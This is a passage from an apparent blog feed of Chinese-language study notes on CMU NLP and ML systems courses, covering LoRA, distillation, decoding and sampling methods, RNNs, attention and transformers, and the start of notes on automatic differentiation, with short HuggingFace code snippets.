2021]</h3><p>关键思想：用低秩矩阵近似权重更新。</p><p>对于权重<span class="math inline">\(W_0 \in \mathbb{R}^{d \timesd&#39;}\)</span>，将更新分解为：</p><p><span class="math display">\[\Delta W = BA, \quad B \in \mathbb{R}^{d \times r}, \; A \in\mathbb{R}^{r \times d&#39;}, \; r \ll \min(d, d&#39;)\]</span></p><ul><li>冻结<span class="math inline">\(W_0\)</span>，仅训练<spanclass="math inline">\(A\)</span>和<spanclass="math inline">\(B\)</span></li><li>最终权重：<span class="math inline">\(W = W_0 + \frac{\alpha}{r}\cdot BA\)</span></li><li>通常应用于注意力层中的<spanclass="math inline">\(W_q\)</span>和<spanclass="math inline">\(W_v\)</span></li><li>训练后，将<span class="math inline">\(\Delta W\)</span>合并到<spanclass="math inline">\(W_0\)</span>中 →<strong>没有额外的推理成本</strong></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207002605984.png" alt="image-20260207002605984" style="zoom:33%;" /></p><h3 id="微调的效果">微调的效果</h3><p><strong>数据效率</strong>：预训练模型在比从头开始训练少得多的示例下达到良好性能（Howard&amp; Ruder 2018 — ULMFiT）。</p><p><strong>分布收敛</strong>：微调最小化<spanclass="math inline">\(D_{\text{KL}}(p_{\text{finetune}} \|p_\theta)\)</span>而不是<spanclass="math inline">\(D_{\text{KL}}(p_{\text{data}} \|p_\theta)\)</span>。模型的分布变得更窄且专业化。</p><p><strong>副作用</strong>：</p><ul><li>摘要模型在翻译时失败（失去了通用性）</li><li>模型变得依赖于训练期间使用的确切提示格式</li><li>微调后少量学习能力可能下降</li></ul><hr /><h2 id="指令微调">指令微调</h2><p>在多个任务上对（指令 +输入，输出）对进行微调，使其学习通用地遵循指令。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207002839337.png" alt="image-20260207002839337" style="zoom: 33%;" /></p><h3 id="聊天微调">聊天微调</h3><p>聊天只是具有对话格式的指令微调：</p><ul><li>系统提示 + [用户，助手，用户，助手，…]</li><li>特殊标记标记角色边界（例如，<code>&lt;|start_header_id|&gt;user&lt;|end_header_id|&gt;</code>）</li><li>指令 + 输入隐式嵌入在对话中</li></ul><p><strong>数据来源</strong>：OpenOrca（16个手写系统提示，GPT-4输出，2.9M示例），LMSys-1M（来自在线LLM服务的真实用户对话）</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207002950797.png" alt="image-20260207002950797" style="zoom:33%;" /></p><h2 id="知识蒸馏">知识蒸馏</h2><p>使用强大的<strong>教师</strong>模型训练一个较小的<strong>学生</strong>模型。两种方法都最小化教师<spanclass="math inline">\(q\)</span>与学生<spanclass="math inline">\(p_\theta\)</span>之间的<spanclass="math inline">\(D_{\text{KL}}(q \| p_\theta)\)</span>。</p><h3 id="标记级蒸馏-hinton-et-al.-2015">标记级蒸馏 [Hinton etal. 2015]</h3><p>学生在每个标记位置模仿教师的<strong>完整概率分布</strong>：</p><p><span class="math display">\[\mathcal{L}_{\text{distill}} = -\sum_{y_t \in V} q(y_t \mid y_{&lt;t},x) \cdot \log p_\theta(y_t \mid y_{&lt;t}, x)\]</span></p><ul><li>使用<strong>软标签</strong>（教师的分布）而不是硬的单热标签</li><li>需要访问教师的logits</li><li>比标准交叉熵提供更丰富的信号（仅使用正确的标记）</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207003122001.png" alt="image-20260207003122001" style="zoom: 25%;" /></p><h3 id="序列级蒸馏-kim-rush-2016">序列级蒸馏 [Kim &amp; Rush 2016]</h3><p>教师<strong>生成</strong>完整输出；学生在其上进行微调：</p><p><span class="math display">\[\mathcal{L}_{\text{seq}} = \mathbb{E}_{y \sim q(y|x)} \left[-\logp_\theta(y \mid x)\right]\]</span></p><ul><li>只需要教师生成的文本，而不是logits（黑箱友好）</li><li>示例：DeepSeek-R1-Distill-Qwen-7B =在DeepSeek-R1的输出上微调的Qwen-7B</li><li>数学上也最小化<span class="math inline">\(D_{\text{KL}}(q \|p_\theta)\)</span>，只是使用蒙特卡洛近似</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260207003300579.png" alt="image-20260207003300579" style="zoom: 25%;" /></p><h3 id="增强教师-west-et-al.-2022">增强教师 [West et al. 2022]</h3><p>教师可以是一个<strong>增强的</strong>LLM：</p><p><span class="math display">\[q \propto p_{\text{LLM}}(y \mid x) \cdot A(x, y)\]</span> 其中<spanclass="math inline">\(A\)</span>是分类器/验证器。如果增强的教师优于单独的<spanclass="math inline">\(p_{\text{LLM}}\)</span>，则蒸馏的学生可以<strong>超越</strong><spanclass="math inline">\(p_{\text{LLM}}\)</span>——学生通过过滤/验证的数据变得比其基础教师更好。</p><h1 id="lec9-解码算法">Lec9 解码算法</h1><h2 id="基本设置">基本设置</h2><h3 id="自回归语言模型">自回归语言模型</h3><p><span class="math display">\[p_\theta(y_{1:T} | x) = \prod_{t=1}^{T} p_\theta(y_t | y_{&lt;t}, x)\]</span></p><h3 id="下一个标记分布">下一个标记分布</h3><p>每个项<span class="math inline">\(p_\theta(y_t | y_{&lt;t},x)\)</span>为下一个标记提供概率分布。</p><p><strong>解码</strong>：选择下一个标记，以便我们最终得到输出<spanclass="math inline">\(y_{1:T}\)</span>。</p><hr /><h2 id="解码作为优化">解码作为优化</h2><h3 id="目标map解码">目标：MAP解码</h3><p>找到最可能的输出： <span class="math display">\[\hat{y} = \arg\max_{y \in \mathcal{Y}} p_\theta(y | x)\]</span></p><ul><li>也称为<strong>模式寻求</strong>或<strong>最大后验（MAP）</strong></li><li>关键挑战：输出空间<spanclass="math inline">\(\mathcal{Y}\)</span>非常大</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210155455010.png" alt="image-20260210155455010" style="zoom:50%;" /></p><h3 id="方法1贪婪解码">方法1：贪婪解码</h3><p>对于<span class="math inline">\(t = 1 \ldots \text{结束}\)</span>：<span class="math display">\[\hat{y}_t = \arg\max_{y_t \in V} p_\theta(y_t | \hat{y}_{&lt;t}, x)\]</span></p><p><strong>局限性</strong>：不保证最可能的序列。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210155537243.png" alt="image-20260210155537243" style="zoom:30%;" /></p><h3 id="方法2束搜索">方法2：束搜索</h3><ul><li>宽度限制的广度优先搜索</li><li>在每一步保持<span class="math inline">\(B\)</span>个可能路径</li><li><span class="math inline">\(B = 1\)</span>：贪婪解码</li><li><span class="math inline">\(B =|V|^{T_{\max}}\)</span>：精确MAP（不可处理）</li><li>实际上：<span class="math inline">\(B = 16\)</span>（超参数）</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210155609745.png" alt="image-20260210155609745" style="zoom:30%;" /></p><p><strong>HuggingFace接口</strong>： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 贪婪</span></span><br><span class="line">model.generate(do_sample=<span class="literal">False</span>, num_beams=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 束搜索</span></span><br><span class="line">model.generate(do_sample=<span class="literal">False</span>, num_beams=<span class="number">16</span>)</span><br></pre></td></tr></table></figure></p><h3 id="map解码的陷阱">MAP解码的陷阱</h3><p><strong>1. 退化</strong> -<strong>重复陷阱</strong>：模型对重复循环分配高概率 -<strong>短序列</strong>：最高概率序列可能为空 - 补救：长度归一化</p><p><strong>2. 非典型性</strong> - 最可能的结果 ≠ 典型结果 -示例：偏置硬币<span class="math inline">\(\Pr[H] =0.6\)</span>，100次翻转的最可能结果是全是正面（非典型！）</p><p><strong>3. 概率分布</strong> -当存在多种方式表达相同事物时，概率在变体之间分散 -最高概率输出可能不是“最佳”</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210160105078.png" alt="image-20260210160105078" style="zoom:25%;" /></p><hr /><h2 id="采样">采样</h2><h3 id="祖先采样">祖先采样</h3><p>对于<span class="math inline">\(t = 1 \ldots \text{结束}\)</span>：<span class="math display">\[\hat{y}_t \sim p_\theta(y_t | \hat{y}_{&lt;t}, x)\]</span></p><ul><li>等同于序列采样：<span class="math inline">\(y_{1:T} \simp_\theta(y_{1:T} | x)\)</span></li><li>通过分类采样实现（PyTorch等）</li></ul><p><strong>HuggingFace接口</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.generate(do_sample=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="祖先采样的问题">祖先采样的问题</h3><p><strong>重尾问题</strong>：</p><ul><li>即使每个坏标记的概率很小，坏标记的总和也具有非平凡的概率</li><li>导致不连贯</li></ul><p><strong>复合错误</strong>： - 采样没有坏标记的概率：<spanclass="math inline">\((1 - \epsilon)^T\)</span> - 示例：<spanclass="math inline">\(\epsilon = 0.01, T = 128 \Rightarrowp(\text{没有坏标记}) = 0.276\)</span></p><h3 id="解决方法截断尾部">解决方法：截断尾部</h3><p><strong>Top-k采样</strong>：仅从<spanclass="math inline">\(k\)</span>个最可能的标记中采样 <spanclass="math display">\[\hat{y}_t \sim \begin{cases}p_\theta(y_t | y_{&lt;t}, x) / Z_t &amp; \text{如果 } y_t \text{ 在top-}k \\0 &amp; \text{否则}\end{cases}\]</span></p><p><strong>Top-p采样</strong>：仅从前<spanclass="math inline">\(p\)</span>概率质量中采样</p><p><strong>温度采样</strong>：使分布更加尖锐 <spanclass="math display">\[\text{softmax}(x, \tau) = \frac{\exp(x/\tau)}{\sum_i \exp(x_i/\tau)}\]</span></p><table><thead><tr class="header"><th>温度</th><th>参数</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr class="odd"><td>高</td><td><span class="math inline">\(\tau \geq 1\)</span></td><td>多样化</td><td>不连贯</td></tr><tr class="even"><td>低</td><td><span class="math inline">\(\tau &lt; 1\)</span></td><td>连贯</td><td>重复</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260210161335068.png" alt="image-20260210161335068" style="zoom:30%;" /></p><p><strong>HuggingFace接口</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Top-k</span></span><br><span class="line">model.generate(do_sample=<span class="literal">True</span>, top_k=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Top-p</span></span><br><span class="line">model.generate(do_sample=<span class="literal">True</span>, top_p=<span class="number">0.9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 温度</span></span><br><span class="line">model.generate(do_sample=<span class="literal">True</span>, temperature=<span class="number">0.7</span>)</span><br></pre></td></tr></table></figure><h3 id="其他截断策略">其他截断策略</h3><table><thead><tr class="header"><th>方法</th><th>阈值策略</th></tr></thead><tbody><tr class="odd"><td>Top-<span class="math inline">\(k\)</span></td><td>从<span class="math inline">\(k\)</span>个最可能的中采样</td></tr><tr class="even"><td>Top-<span class="math inline">\(p\)</span></td><td>累计概率最多为<span class="math inline">\(p\)</span></td></tr><tr class="odd"><td><span class="math inline">\(\epsilon\)</span></td><td>概率至少为<span class="math inline">\(\epsilon\)</span></td></tr><tr class="even"><td><span class="math inline">\(\eta\)</span></td><td>最小概率与熵成比例</td></tr><tr class="odd"><td>Min-<span class="math inline">\(p\)</span></td><td>概率至少为<spanclass="math inline">\(p_{\min}\)</span>，按最大标记概率缩放</td></tr></tbody></table><hr /><h2 id="加速解码">加速解码</h2><h3 id="为什么解码慢">为什么解码慢？</h3><p><strong>时间瓶颈</strong>： <span class="math display">\[\text{时间} = \max\left(\frac{\text{操作FLOPs}}{\text{设备FLOP/s}},\frac{\text{传输数据（GB）}}{\text{内存带宽（GB/s）}}\right)\]</span></p><ul><li><strong>计算限制</strong>：例如，<span class="math inline">\(A =BC\)</span>（矩阵乘法）</li><li><strong>内存限制</strong>：例如，<span class="math inline">\(a =Bx\)</span>（矩阵-向量乘法）</li><li>解码一个标记通常是<strong>内存限制</strong>的</li></ul><h3 id="指标">指标</h3><p><strong>延迟</strong>：用户等待多久？ -第一个标记的时间，每个请求的时间</p><p><strong>吞吐量</strong>：每秒完成多少请求？ -每秒标记数，每秒请求数</p><h3 id="键值缓存">键值缓存</h3><p><strong>问题</strong>：没有缓存，计算注意力需要<spanclass="math inline">\(O(T^2)\)</span>的重新计算。</p><p><strong>解决方案</strong>：存储先前计算的键和值。</p><p>在解码的第<span class="math inline">\(t\)</span>步（1层，1头）：<span class="math display">\[\begin{align}q_t &amp;= h_t W_q \in \mathbb{R}^{1 \times d_k} \\k_t &amp;= h_t W_K \in \mathbb{R}^{1 \times d_k} \\v_t &amp;= h_t W_V \in \mathbb{R}^{1 \times d_v}\end{align}\]</span></p><p>缓存：<span class="math inline">\(K_{1:t-1} \in \mathbb{R}^{(t-1)\times d_k}\)</span>，<span class="math inline">\(V_{1:t-1} \in\mathbb{R}^{(t-1) \times d_v}\)</span></p><p>将<span class="math inline">\(k_t\)</span>附加到<spanclass="math inline">\(K_{1:t-1}\)</span>，将<spanclass="math inline">\(v_t\)</span>附加到<spanclass="math inline">\(V_{1:t-1}\)</span>： <span class="math display">\[z_t = \text{softmax}\left(\frac{q_t K_{1:t}^T}{\sqrt{d_k}}\right)V_{1:t}\]</span></p><p><strong>加速</strong>：将<spanclass="math inline">\(O(T^2)\)</span>减少到<spanclass="math inline">\(O(T)\)</span>计算。</p><h3 id="加速单个标记">加速单个标记</h3><table><thead><tr class="header"><th>目标</th><th>策略</th><th>示例</th></tr></thead><tbody><tr class="odd"><td>减少内存带宽</td><td>量化、蒸馏、架构</td><td>GPTQ、AWQ、GQA/MQA</td></tr><tr class="even"><td>增加FLOP/s</td><td>在硬件上优化操作</td><td>FlashAttention、torch.compile</td></tr><tr class="odd"><td>减少FLOPs</td><td>在架构中减少FLOPs</td><td>专家混合、Mamba</td></tr></tbody></table><h3 id="加速完整序列">加速完整序列</h3><table><thead><tr class="header"><th>策略</th><th>思路</th><th>示例</th></tr></thead><tbody><tr class="odd"><td>在时间上并行化</td><td>便宜地草拟标记，进行并行验证</td><td>投机解码</td></tr><tr class="even"><td>在时间上并行化</td><td>并行生成多个标记</td><td>非自回归模型</td></tr></tbody></table><p><strong>投机解码</strong>： 1. 使用小型<strong>草拟模型</strong><spanclass="math inline">\(q\)</span>提前生成标记 2. 大模型<spanclass="math inline">\(p\)</span>并行处理草拟的标记 3. 以概率接受：<spanclass="math inline">\(\alpha_i = \min\left(1, \frac{p(\text{标记} |\ldots)}{q(\text{标记} | \ldots)}\right)\)</span></p><h3 id="加速多个序列">加速多个序列</h3><table><colgroup><col style="width: 33%" /><col style="width: 33%" /><col style="width: 33%" /></colgroup><thead><tr class="header"><th>策略</th><th>思路</th><th>示例</th></tr></thead><tbody><tr class="odd"><td>状态重用</td><td>共享前缀<spanclass="math inline">\(\Rightarrow\)</span>共享KV缓存</td><td>PagedAttention、RadixAttention</td></tr><tr class="even"><td>改进批处理</td><td>更好的调度</td><td>连续批处理</td></tr><tr class="odd"><td>程序级优化</td><td>优化完整生成图</td><td>SGLang、DSPy</td></tr></tbody></table><hr /><h2 id="总结">总结</h2><ol type="1"><li><strong>解码作为优化</strong>：贪婪、束搜索、MAP（固定路线最大化概率）<ul><li>陷阱：退化、非典型性、概率分布</li></ul></li><li><strong>采样</strong>：祖先、top-k、top-p、温度。（改变后续采样的概率分布）<ul><li>解决尾部概率和多样性问题</li></ul></li><li><strong>高效推理</strong>：KV缓存、投机解码、批处理<ul><li>对于大规模部署至关重要</li></ul></li></ol><blockquote><p>一个关键的收获是，束搜索或贪婪是基于搜索的，它希望获得一个固定的优化输出，但采样引入了多样性或变异，以生成更具创造性的答案，并可能得到不同的答案。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CMU 11-711 Advanced NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Natural Language Processing </tag>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> 11711 </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11711 Advanced NLP: Architectures</title>
      <link href="/zh/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Architectures/"/>
      <url>/zh/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Architectures/</url>
      
        <content type="html"><![CDATA[<h1 id="lec4-循环神经网络">Lec4 循环神经网络</h1><p><strong>动机：</strong> N-gram 和前馈模型的上下文有限（N-1个标记）。RNN 理论上提供无限的上下文。</p><h2 id="三种序列模型">三种序列模型</h2><ul><li><strong>递归：</strong> 基于历史编码条件表示</li><li><strong>卷积：</strong> 基于局部上下文条件表示</li><li><strong>注意力：</strong> 基于所有标记的加权平均条件表示</li></ul><h2 id="基本-rnn-elman-1980">基本 RNN (Elman, 1980)</h2><p>一个序列模型 <span class="math inline">\(f_\theta(x_1, \ldots,x_{|x|}) \rightarrow h_1, \ldots,h_{|x|}\)</span>，在每一步转换隐藏状态：</p><p><span class="math display">\[h_t = \sigma(W_h h_{t-1} + W_x x_t +b)\]</span></p><p>其中 <span class="math inline">\(\sigma\)</span> 是激活函数（tanh,relu），<span class="math inline">\(h_t \in \mathbb{R}^d\)</span>是隐藏状态，参数 <span class="math inline">\(\theta = \{W_h \in\mathbb{R}^{d \times d}, W_x \in \mathbb{R}^{d \times d_{in}}, b \in\mathbb{R}^d\}\)</span></p><p><strong>用于语言建模：</strong> <spanclass="math inline">\(p_\theta(\cdot \mid x_{&lt;t}) = \text{softmax}(Wh_t)\)</span></p><h2 id="rnn-训练">RNN 训练</h2><p><strong>时间反向传播 (BPTT)：</strong> 将 RNN 展开为 DAG计算图，运行标准反向传播。</p><ul><li>每一步使用相同的参数；梯度被累积</li><li>训练目标（最大似然估计）：<span class="math inline">\(\min -\sum_{x\in D_{train}} \sum_t \log p_\theta(x_t \mid x_{&lt;t})\)</span></li><li><strong>并行化困难：</strong> 在步骤 <spanclass="math inline">\(t\)</span> 计算损失需要 <spanclass="math inline">\(h_t\)</span>，这依赖于 <spanclass="math inline">\(h_{t-1}, h_{t-2}, \ldots\)</span></li></ul><h2 id="rnn-推理">RNN 推理</h2><p>生成一个标记 → 使用新的隐藏状态 → 重复直到 <code>[EOS]</code></p><ul><li><strong>优点：</strong> 只需存储上一个隐藏状态（常量内存），每步<span class="math inline">\(O(1)\)</span>，总长度 <spanclass="math inline">\(T\)</span> 为 <spanclass="math inline">\(O(T)\)</span></li><li><strong>缺点：</strong> 顺序处理，无法并行化</li></ul><h2 id="消失梯度">消失梯度</h2><p>梯度在反向传播时减小：<span class="math inline">\(\frac{\partialL}{\partial h_0}\)</span> 变得微小。</p><p><strong>为什么？</strong> <span class="math inline">\(\frac{\partialh_T}{\partial h_t} = \prod_{t&#39;=t}^{T} \frac{\partialh_{t&#39;+1}}{\partial h_{t&#39;}}\)</span>，其中 <spanclass="math inline">\(\frac{\partial h_{t&#39;+1}}{\partial h_{t&#39;}}= \text{diag}(\tanh&#39;(\cdot)) W\)</span></p><p>当 <span class="math inline">\(W\)</span> 的主特征值 <spanclass="math inline">\(&lt; 1\)</span>时，梯度指数消失。<strong>影响：</strong> 无法建模长距离依赖关系！</p><h2 id="门控解决方案">门控：解决方案</h2><p><strong>基本思想：</strong> 通过学习的门在时间步之间传递信息。</p><p><span class="math display">\[h_t = (1 - z_t) \odot h_{t-1} + z_t\odot \tilde{h}_t\]</span></p><p>其中 <span class="math inline">\(z_t = \sigma(W_z x_t + U_zh_{t-1})\)</span> 是更新门，<spanclass="math inline">\(\tilde{h}_t\)</span> 是候选状态。</p><ul><li>当 <span class="math inline">\(z \to 0\)</span>：保留长期信息（<spanclass="math inline">\(\frac{\partial h_{t_2}}{\partial h_{t_1}} =1\)</span>）</li><li>当 <span class="math inline">\(z &gt;0\)</span>：结合新的隐藏状态</li></ul><h3 id="gru-cho-et-al.-2014">GRU (Cho et al., 2014)</h3><p>2-门架构： - <strong>更新门</strong> <spanclass="math inline">\(z_t\)</span>：我应该更新上一个隐藏状态吗？ -<strong>重置门</strong> <span class="math inline">\(r_t = \sigma(W_r x_t+ U_r h_{t-1})\)</span>：我应该在更新中使用隐藏状态吗？</p><p><span class="math display">\[\hat{h}_t = \tanh(W_h x_t + U_h(r_t\odot h_{t-1})), \quad h_t = (1-z_t) \odot h_{t-1} + z_t \odot\hat{h}_t\]</span></p><h3 id="lstm-hochreiter-schmidhuber-1997">LSTM (Hochreiter &amp;Schmidhuber, 1997)</h3><p>4-门架构，带有额外的上下文向量。在实践中，GRU/LSTM 是对普通 RNN的替代。</p><h2 id="编码器-解码器">编码器-解码器</h2><p><strong>动机：</strong> 条件生成 <spanclass="math inline">\(p_\theta(y_1, \ldots, y_T \midx)\)</span>（例如，翻译、摘要）</p><p><strong>架构：</strong> 将输入 <span class="math inline">\(x\)</span>编码为上下文向量 <span class="math inline">\(c \in\mathbb{R}^d\)</span>，在解码器中使用： - 初始化解码器隐藏状态 -包含在递归更新中：<span class="math inline">\(W[h_t; x_t; c]\)</span> -包含在输出层：<span class="math inline">\(\text{softmax}(W[h_t;c])\)</span></p><p><strong>训练：</strong> <span class="math inline">\(\min_\theta\sum_{(x,y) \in D} \sum_t -\log p_\theta(y_t \mid y_{&lt;t},x)\)</span></p><p><strong>局限性：</strong>所有标记只有一个上下文向量——我们能做得更好吗？</p><h2 id="注意力-bahdanau-et-al.-2015">注意力 (Bahdanau et al., 2015)</h2><p><strong>关键思想：</strong>在每个解码器步骤计算不同的上下文向量，作为编码器状态的加权和。</p><ul><li><strong>键：</strong> 编码器状态 <spanclass="math inline">\(h_1^{enc}, \ldots, h_N^{enc}\)</span></li><li><strong>查询：</strong> 当前解码器隐藏状态 <spanclass="math inline">\(h\)</span></li><li><strong>注意力分数：</strong> <span class="math inline">\(\alpha_n =\text{score}(h, h_n^{enc})\)</span></li><li><strong>上下文向量：</strong> <span class="math inline">\(c =\sum_{n=1}^{N} \alpha_n h_n^{enc}\)</span></li></ul><p><strong>分数函数：</strong> - 点积：<spanclass="math inline">\(\text{score}(q, k) = q^\top k\)</span> -双线性：<span class="math inline">\(\text{score}(q, k) = q W k\)</span>- 非线性：<span class="math inline">\(\text{score}(q, k) = w^\top\tanh(W[q; k])\)</span></p><p><strong>用法：</strong> <span class="math inline">\(\text{logits} =\tanh(W_{out}[c_t; h_t])\)</span></p><h2 id="关键要点">关键要点</h2><ul><li>RNN：具有递归隐藏状态的序列模型（理论上无限上下文）</li><li>普通 RNN 遇到消失梯度问题 → 使用 GRU/LSTM</li><li>编码器-解码器用于条件生成</li><li>注意力：通过编码器状态的加权和动态上下文向量</li><li>RNN 训练是顺序的（难以并行化）→ 激励变换器（下一讲）</li></ul><h1 id="lec5-变换器">Lec5 变换器</h1><p>此内容类似于 <ahref="https://xloverflow.github.io/2025/12/16/CS336/CS336-Lec3-Architectures-Hyperparameters/">CS336-Lec3架构与超参数</a></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130002623323.png" alt="image-20260130002623323" style="zoom:40%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130002716882.png" alt="image-20260130002716882" style="zoom:40%;" /></p><p><strong><u>注意力分数函数</u></strong>：最常用的函数是<strong><u>缩放点积</u></strong>。这解决了点积的规模随着维度增大而增加的问题。<span class="math display">\[a(q, k) = \frac{q^\top k}{\sqrt{|k|}}\]</span><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130003730167.png" alt="image-20260130003730167" style="zoom:40%;" /></p><p><u><strong>多头的直觉</strong></u>：句子不同部分的信息可以以不同方式帮助消歧。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260130011718563.png" alt="image-20260130011718563" style="zoom:40%;" /></p>]]></content>
      
      
      <categories>
          
          <category> CMU 11-711 高级自然语言处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Natural Language Processing </tag>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> 11711 </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11868 LLM Sys &amp; 15642 ML Sys: DL Frameworks and Auto Differentiation</title>
      <link href="/zh/2026/01/28/11868-LLM-Sys/11868-LLM-Sys-15642-ML-Sys-DL-Framworks-and-Auto-Differentiation/"/>
      <url>/zh/2026/01/28/11868-LLM-Sys/11868-LLM-Sys-15642-ML-Sys-DL-Framworks-and-Auto-Differentiation/</url>
      
        <content type="html"><![CDATA[<h1 id="自动微分与深度学习框架">自动微分与深度学习框架</h1><hr /><h2 id="学习问题与梯度下降">1. 学习问题与梯度下降</h2><p>给定训练集 <strong>D = {(xₙ, yₙ)}</strong>，目标是找到模型参数<strong>θ</strong>，使损失函数最小化： <span class="math display">\[\min_{\theta} \mathcal{L}(\theta), \quad \mathcal{L} : \mathbb{R}^d \to\mathbb{R}\]</span> 对于分类问题，标准损失是 <strong>交叉熵</strong>。PyTorch 的<code>CrossEntropyLoss</code> 直接在原始 logits（softmax之前）上应用负对数似然，这在数值上是稳定的。</p><h3 id="为什么选择梯度下降">为什么选择梯度下降？</h3><p>在当前参数 xₜ 周围使用一阶泰勒展开： <span class="math display">\[f(x_t + \Delta x) \approx f(x_t) + \Delta x^T \nabla f \big|_{x_t}\]</span> 为了使 f减小，我们希望第二项尽可能为负。根据柯西-施瓦茨不等式，最佳方向是<strong>与梯度相反</strong>，这给出了 SGD 更新规则： <spanclass="math display">\[x_{t+1} = x_t - \eta \cdot \nabla f \big|_{x_t}\]</span> 其中 <strong>η</strong> 是学习率超参数。</p><h3 id="sgd-算法">SGD 算法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">设置学习率 η</span><br><span class="line">1. 初始化 θ ← θ₀</span><br><span class="line">2. 对于 epoch = 1 到 maxEpoch:</span><br><span class="line">3.     对于数据中的每个小批量:</span><br><span class="line">4.         total_g = 0</span><br><span class="line">5.         对于批量中的每个 (x, y):</span><br><span class="line">6.             计算误差: err(f(x; θ), y)</span><br><span class="line">7.             计算梯度: g = ∂err/∂θ</span><br><span class="line">8.             total_g += g</span><br><span class="line">9.         更新: θ = θ - η * total_g / N</span><br></pre></td></tr></table></figure><blockquote><p><strong>关键问题：</strong> 如何高效计算 ∂ℒ/∂θ 对于任意深度网络中的<em>每个</em> 参数？这正是自动微分所解决的问题。</p></blockquote><hr /><h2 id="计算图">2. 计算图</h2><p><strong>计算图</strong> 是一个有向无环图（DAG），其中：</p><ul><li><strong>节点</strong> 代表变量（输入、参数、中间值）或操作。</li><li><strong>有向边</strong> 表示数据流 — 每个操作的输入。</li></ul><h3 id="通过拓扑排序进行前向评估">通过拓扑排序进行前向评估</h3><p>要评估图：</p><ol type="1"><li>将所有节点放入未处理队列中。</li><li>重复查找所有输入已计算的节点。</li><li>评估该节点，将其移至已处理集合。</li><li>重复直到所有节点都被评估。</li></ol><p>这确保每个节点在有效的依赖顺序中被计算一次。</p><hr /><h2 id="微分方法分类">3. 微分方法：分类</h2><table><colgroup><col style="width: 12%" /><col style="width: 36%" /><col style="width: 16%" /><col style="width: 35%" /></colgroup><thead><tr class="header"><th>方法</th><th>工作原理</th><th>对 f 的成本: ℝⁿ → ℝ</th><th>实际应用</th></tr></thead><tbody><tr class="odd"><td><strong>数值</strong></td><td>在扰动点评估 f；有限差分</td><td>O(n) 前向传递</td><td>仅用于梯度检查 — 对训练来说太慢且不稳定</td></tr><tr class="even"><td><strong>符号</strong></td><td>代数地应用求和/乘积/链式法则</td><td>可能呈指数级膨胀</td><td>CAS 工具（Mathematica）。对于大型模型，表达式膨胀不切实际</td></tr><tr class="odd"><td><strong>前向模式 AD</strong></td><td>在一次前向传递中传播导数“切线”与值</td><td>O(n) 前向传递</td><td>当 n 较小时效果良好（例如，Hessian-向量积）</td></tr><tr class="even"><td><strong>反向模式 AD</strong></td><td>先前向运行，然后向后传播“伴随”</td><td><strong>O(1) 后向传递</strong></td><td>深度学习的主力 — 一次传递给出所有 ∂ℒ/∂θ</td></tr></tbody></table><blockquote><p><strong>关键见解：</strong> 对于 f: ℝⁿ →ℝ（标量损失，多个参数），反向模式 AD 在与 <em>单个</em>前向传递成比例的时间内计算完整梯度。前向模式需要 n 次传递。</p></blockquote><hr /><h2 id="前向模式自动微分">4. 前向模式自动微分</h2><p>前向模式 AD 通过携带每个中间值的<strong>切线</strong>（导数值）来计算导数，沿着与前向计算相同的方向传播。</p><h3 id="定义">定义</h3><p>对于每个中间值 vᵢ，定义： <span class="math display">\[\dot{v}_i = \frac{\partial v_i}{\partial x_1}\]</span></p><h3 id="示例">示例</h3><p><code>y = ln(x₁) + x₁·x₂ − sin(x₂)</code>，计算 ∂y/∂x₁：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 